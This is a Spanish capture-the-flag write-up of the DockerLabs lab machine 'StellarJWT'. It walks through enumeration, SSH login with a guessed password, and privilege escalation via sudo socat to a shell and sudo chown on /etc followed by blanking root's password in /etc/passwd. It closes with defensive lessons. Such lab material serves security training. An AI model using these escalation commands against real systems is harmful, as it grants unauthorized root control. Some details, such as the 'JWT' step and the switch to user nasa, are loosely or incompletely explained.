# StellarJWT — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Alv-fh  
**Fecha de creación:** 25/10/2024  
**Técnicas:** Gobuster · JWT Analysis · CyberChef · SSH · sudo socat abuse · sudo chown abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Análisis JWT y acceso SSH](#3-análisis-jwt-y-acceso-ssh)
4. [Escalada de privilegios — usuario elite](#4-escalada-de-privilegios--usuario-elite)
5. [Escalada final a root](#5-escalada-final-a-root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh stellarjwt.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x txt,php,html
```

Resultado:

```text
/index.html
/universe
```

Exploramos las páginas encontradas.

Una de ellas muestra la pregunta:

```text
¿Qué astrónomo alemán descubrió Neptuno?
```

Inspeccionando el código fuente encontramos un token cifrado.

Utilizamos CyberChef para decodificarlo.

Herramienta utilizada:

[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)

El resultado revela un posible usuario:

```text
Neptuno
```

La respuesta correcta a la pregunta es:

```text
Johann Gottfried Galle
```

---

## 3. Análisis JWT y acceso SSH

Probamos las credenciales por SSH:

```bash
ssh neptuno@172.17.0.2
```

Contraseña:

```text
galle
```

Acceso correcto.

Exploramos el directorio del usuario:

```bash
ls -la
```

Encontramos:

```text
.carta_a_la_NASA.txt
```

Leemos el contenido:

```bash
cat .carta_a_la_NASA.txt
```

Resultado:

```text
¿Qué significan las siglas NASA?
...
Obtén fondo la NASA? -> Eisenhower
```

El archivo contiene posibles contraseñas relacionadas con NASA.

---

## 4. Escalada de privilegios — usuario elite

Cambiamos al usuario `nasa`:

```bash
su nasa
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(elite) NOPASSWD: /usr/bin/socat
```

Consultamos GTFOBins y ejecutamos:

```bash
sudo -u elite /usr/bin/socat stdin exec:/bin/sh
```

Verificamos usuario:

```bash
whoami
elite
```

Comprobamos nuevamente privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/chown
```

---

## 5. Escalada final a root

Consultamos GTFOBins para `chown`.

Asignamos permisos sobre `/etc`:

```bash
LFILE=/etc
sudo /usr/bin/chown $(id -un):$(id -gn) $LFILE
```

Modificamos `/etc/passwd` para eliminar la contraseña de root:

```bash
/usr/bin/sed -i 's/root:x:/root::/g' /etc/passwd
```

Cambiamos al usuario root:

```bash
su root
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información sensible en frontend | Descubrimiento de usuarios |
| JWT/strings decodificables | Obtención de credenciales |
| Contraseña predecible SSH | Acceso remoto |
| sudo sobre socat | Escalada horizontal |
| sudo sobre chown | Escalada final a root |

**Para defenderse:**

- No exponer información sensible en el código fuente.
- Utilizar tokens correctamente firmados y protegidos.
- Aplicar políticas robustas de contraseñas.
- Restringir binarios peligrosos ejecutables mediante sudo.
- Auditar permisos críticos sobre archivos del sistema.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
